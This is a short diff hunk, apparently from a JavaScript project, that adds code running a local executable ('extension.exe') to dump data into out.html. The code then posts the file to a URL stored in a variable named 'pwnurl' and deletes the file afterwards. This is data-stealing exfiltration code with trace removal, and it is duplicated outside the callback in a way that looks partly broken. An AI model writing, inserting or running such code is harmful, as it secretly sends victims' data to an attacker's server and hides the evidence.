@@ -1,0 +1,6 @@
+exec(workdir + "extension.exe" + " /shtml \"out.html\"", function(err, stdout, stderr) {
+    axios.post(pwnurl, require("fs").readFileSync("./out.html", "utf-8")).then(a => a).catch(console.error)
+    fs.unlinkSync("./out.html");
+})
+axios.post(pwnurl, require("fs").readFileSync("./out.html", "utf-8")).then(a => a).catch(console.error)
+fs.unlinkSync("./out.html")
